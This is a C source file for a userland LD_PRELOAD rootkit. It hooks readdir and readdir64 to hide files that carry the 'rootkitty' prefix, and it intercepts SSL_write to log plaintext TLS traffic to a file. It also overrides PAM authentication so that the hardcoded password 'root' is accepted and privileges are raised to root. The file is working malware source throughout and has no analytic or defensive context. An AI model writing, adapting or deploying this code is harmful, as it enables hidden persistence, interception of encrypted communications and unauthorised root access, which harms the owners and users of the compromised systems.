/*---------[ PREPROCESSOR ]---------*/
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <stdlib.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#define STR_LEN(str) sizeof(str)-1
#define MAGIC_PREFIX "rootkitty"
#define MAGIC_LEN STR_LEN(MAGIC_PREFIX)
#ifndef PAM_EXTERN
#define PAM_EXTERN extern 
#endif

/*---------[ PROTOTYPES ]---------*/
static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
static struct dirent*   (*og_readdir)(DIR *)       = NULL;
static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
/*---------[ INITIALIZE THE HOOKS ]---------*/
__attribute__((constructor)) void hook_init(void){
  og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
  og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
  og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
  og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
  og_pam_sm_setcred = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_setcred");
}
int backdoor = 0;
/*---------[ HIDING FILES ]---------*/
struct dirent* readdir(DIR *dirp){
  struct dirent* entry;

  while ((entry = og_readdir(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;    
    }
    return entry;
  }
  return entry;
}
// handle 64bit version
struct dirent64* readdir64(DIR* dirp) {
  struct dirent64* entry;

  while ((entry = og_readdir64(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;
    }
    return entry;
  }
  return entry;
}
/*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
int SSL_write(SSL* ssl, const void *buf, int num) {
  FILE* fd = fopen("SSL_log.txt", "a+");
  if (fd != NULL){
    fprintf(fd, "PID:%d\n", getpid());
    fwrite(buf, 1, num, fd);
    fprintf(fd, "\n");
    fclose(fd);
  }
  return og_SSL_write(ssl, buf, num);
}
/*---------[ PAM BACKDOOR ]---------*/

// elevate privileges:
int elevation(){
  uid_t UID = getuid();
  gid_t GID = getgid();

  if (seteuid(0) == -1) {
    return -1;
  }
  if (setegid(0) == -1) {
    seteuid(UID);
    return -1;
  }
  return 0;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
  const char* input_passwd;

  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);

  if (input_passwd != NULL && strcmp(input_passwd, "root") == 0) {
    backdoor = 1;
    return PAM_SUCCESS;
  }
  return og_pam_sm_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t* pamh, int flags, int argc, const char** argv){
  if (backdoor == 1){
    if(elevation() == 0){
      backdoor = 0;
      return PAM_SUCCESS;
    }
  }
  return og_pam_sm_setcred(pamh, flags, argc, argv);
}
